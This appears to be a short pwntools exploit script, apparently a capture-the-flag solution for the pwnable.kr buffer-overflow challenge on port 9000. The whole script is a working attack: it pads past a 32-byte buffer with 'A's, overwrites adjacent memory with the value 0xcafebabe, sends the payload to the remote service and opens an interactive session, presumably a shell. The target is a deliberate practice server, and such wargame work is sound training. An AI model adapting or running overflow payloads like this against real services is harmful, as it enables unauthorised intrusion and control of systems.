from pwn import *

payload = 'A'*32 + p32(0xcafebabe)*10

ses = remote('pwnable.kr', 9000)
ses.sendline(payload)
ses.interactive()
